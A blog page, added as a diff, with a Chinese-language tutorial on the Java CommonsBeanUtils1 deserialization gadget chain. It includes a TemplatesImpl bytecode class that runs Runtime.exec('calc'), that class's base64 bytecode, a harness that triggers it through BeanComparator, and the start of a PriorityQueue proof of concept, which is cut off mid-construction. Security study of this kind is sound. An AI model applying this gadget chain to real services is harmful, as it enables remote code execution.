@@ -1,0 +1,775 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 【java安全】CommonsBeanUtils1前言在之前我们学习了java.util.PriorityQueue，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了java.io.Comparator接口的compare()方法，进而执行恶意反序列化操作 我们能不能找到除了之前提到的Transfo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/[java%E5%AE%89%E5%85%A8]CommonsBeanUtils1/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 【java安全】CommonsBeanUtils1前言在之前我们学习了java.util.PriorityQueue，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了java.io.Comparator接口的compare()方法，进而执行恶意反序列化操作 我们能不能找到除了之前提到的Transfo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308021631153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308021734115.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.260Z">
+<meta property="article:modified_time" content="2023-08-02T11:42:18.489Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308021631153.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          90 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月2日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="【java安全】CommonsBeanUtils1"><a href="#【java安全】CommonsBeanUtils1" class="headerlink" title="【java安全】CommonsBeanUtils1"></a>【java安全】CommonsBeanUtils1</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在之前我们学习了<code>java.util.PriorityQueue</code>，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了<code>java.io.Comparator</code>接口的<code>compare()</code>方法，进而执行恶意反序列化操作</p>
+<p>我们能不能找到除了之前提到的<code>TransformingComparator</code>类以外的其他可以利用的<code>java.util.Comparator</code>对象？我们需要了解一下<code>Commons Beanuitls</code></p>
+<h3 id="Apache-Commons-Beanutils"><a href="#Apache-Commons-Beanutils" class="headerlink" title="Apache Commons Beanutils"></a>Apache Commons Beanutils</h3><p>在找可用的<code>Comparator</code>之前，我们需要知道一下<code>Apache Commons Beanutils</code>，它是<code>Apache Commons</code>工具集下的一个项目，提供了对java类对象(javaBean)的一些操作方法</p>
+<blockquote>
+<p>什么是javaBean?</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123; <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>javaBean就是一种标准化的java对象，成员变量为<code>private</code>，提供了对成员变量的<code>getter()</code>和<code>setter()</code>方法，符合驼峰命名法</p>
+</blockquote>
+<p>在<code>Commons Beanutils</code>中提供了一个静态方法<code>PropertyUtils.getProperty()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProperty</span><span class="hljs-params">(Object bean, String name)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;<br>        <span class="hljs-keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法可以可以调用任意javaBean对象的<code>getter()</code>方法</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(),<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个方法会调用<code>Cat</code>对象的<code>getName()</code>方法，使用该方法可以调用任意对象的<code>getter</code>方法</p>
+<h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>我们上文说想要找到其他的实现<code>java.util.Comparator</code>的类</p>
+<p>在<code>commons-beanutils</code>中有一个<code>BeanComparator</code>类：</p>
+<p>先看看构造方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>((String)<span class="hljs-literal">null</span>);<br>    &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">(String property)</span> &#123;<br>    <span class="hljs-built_in">this</span>(property, ComparableComparator.getInstance());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">(String property, Comparator&lt;?&gt; comparator)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setProperty(property);<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.comparator = comparator;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.comparator = ComparableComparator.getInstance();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>构造方法可以为：<code>property</code>属性赋值，这个很重要后面会用到</p>
+<p>然后看看<code>compare()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.commons.beanutils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanComparator</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;T&gt;, Serializable &#123;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(T o1, T o2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.property == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.internalCompare(o1, o2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.internalCompare(value1, value2);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var5) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + var5.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + var6.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var7) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们注意一下它的<code>compare(T o1, T o2)</code>方法，当<code>property==null</code>时,不会调用<code>PropertyUtils.getProperty()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.property == <span class="hljs-literal">null</span>) &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.internalCompare(o1, o2);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>PropertyUtils.getProperty()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br></code></pre></td></tr></table></figure>
+
+<p>它会去调用<code>o1、o2</code>对象的名为property的属性值的<code>getter</code>方法</p>
+<p>这里很重要，加入<code>o1</code>是<code>TemplatesImpl</code>对象的话这里是可以构造反序列化利用链的</p>
+<p>我们先来回顾一下前面<code>TemplatesImpl</code>中的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()<br>-&gt; TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure>
+
+<p>这里的<code>getOutputProperties()</code>就是<code>getter</code>方法的形式，并且它会调用<code>newTransformer()</code>触发恶意字节码执行。因此，如果我们<code>PropertyUtils.getProperty(o1, this.property)</code>第一个形参传入：<code>TemplatesImpl</code>对象，并且第二个参数<code>property</code>传入值<code>outputProperties</code></p>
+<p>那么就会调用<code>TemplatesImpl#getOutputProperties()</code>方法了</p>
+<p>我们可以简单测试一下：</p>
+<p>我们先构造一个恶意字节码的类<code>HelloTemplatesImpl</code>：(注意需要继承<code>AbstractTranslet</code>,这样才有效)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>); <span class="hljs-comment">//构造对象会弹出计算器</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们将其编译为字节码并且base64编码一下</p>
+<p>然后编写利用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanUtils1</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAwACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAQAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABIABAATAA0AFAALAAAABAABABAAAQARAAAAAgAS&quot;</span>.getBytes());<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        beanComparator.compare(obj,<span class="hljs-literal">null</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308021631153.png" srcset="/img/loading.gif" lazyload alt="image-20230802163106973"></p>
+<p>确实弹出了计算器，说明这是对的</p>
+<h3 id="如何调用BeanComparator-compare-方法？"><a href="#如何调用BeanComparator-compare-方法？" class="headerlink" title="如何调用BeanComparator#compare()方法？"></a>如何调用<code>BeanComparator#compare()</code>方法？</h3><p>我们这里可以继续使用<code>PriorityQueue</code>类，它的<code>readObject()</code>方法可以触发排序等函数，最终调用<code>comparator</code>变量的<code>compare()</code> 方法，并且形参传入<code>TemplatesImpl</code>对象（注意讲<code>BeanComparator</code>的<code>property</code>设置为<code>outputProperties</code>）</p>
+<p>PriorityQueue#siftDownUsingComparator()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p>当反序列化时调用<code>PriorityQueue#readObject()</code>方法，最终调用<code>comparator#compare()</code>，然后调用<code>TemplatesImpl#getOutputProperties()</code>方法</p>
+<h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>首先常规构造<code>TemplatesImpl</code>对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure>
+
+<p>然后构造<code>BeanComparator</code>类，我们先不为<code>property</code>赋值，防止提前调用<code>PropertyUtils.getProperty()</code>:</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">BeanComparator comparator <span class="hljs-operator">=</span> new BeanComparator()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后创建<code>PriorityQueue</code>，队列大小为2，将<code>comparator</code>成员变量赋值为<code>BeanComparator</code>对象：</p>
